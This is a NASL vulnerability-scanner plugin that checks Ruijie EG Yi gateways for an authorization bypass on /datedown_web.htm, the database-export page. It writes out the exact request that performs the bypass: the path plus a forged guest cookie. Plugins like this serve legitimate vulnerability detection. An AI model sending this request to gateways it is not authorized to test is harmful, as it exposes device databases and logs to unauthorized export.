############################################################
# Author: shiyunshu
# Copyright @WebRAY
############################################################
include("compat.inc");


if(description)
{
 script_id(51799209);
 name = "Ruijie EG Yi gateway datedown_web.htm - Authorization bypass";
 script_name(name);
 script_category(ACT_ATTACK);
 script_family("CNLocal");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_set_attribute(attribute:"risk_factor", value:"Medium");
 script_set_attribute(attribute:"description", value:"Ruijie EG Yi gateway /datedown_web.htm file authorization bypass,it can export the database for local backup.");
 script_set_attribute(attribute:"solution", value:"Encrypt and properly store the documents storing sensitive information to avoid leakage of sensitive information.");
 script_end_attributes();
 script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
 script_require_ports("Services/www", 80);
 exit(0);
}


#
# The script code starts here
#
include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");


function check_vuln(port){
	if ( !get_port_state(port) ) exit(0);
	url = string("/datedown_web.htm");
	req = http_send_recv3(method: "GET", port: port, item: url,  add_headers: make_array("User_Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0","Cookie", "auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest; c_name=; p_name=; p_pass=; web-coding=gb2312; currentURL=index" ));
	if( req[2] == NULL) exit(0);
	con = url + req[1] + req[2];
	if( "200 ">< req[0] && 'database_export :"Database export"' >< req[2] && 'nat_log_traffic:"NAT log"' >< req[2] ){
	  	if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
    }
}

function check_vuln_ssl(port){
	if ( !get_port_state(port) ) exit(0);
	url = string("/datedown_web.htm");
	res = http_send_recv3(method: "GET", port: port, item: url,  add_headers: make_array("User_Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0","Cookie", "auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest; c_name=; p_name=; p_pass=; web-coding=gb2312; currentURL=index" ));
	req = http_last_sent_request();
    ssl_req = https_req_get(port:port , request:req);
	if( ssl_req == NULL) exit(0);
	con = url + ssl_req;
	if( "200 O"><ssl_req && 'database_export :"Database export"'><ssl_req && 'nat_log_traffic:"NAT log"'><ssl_req){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}


##################################
kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}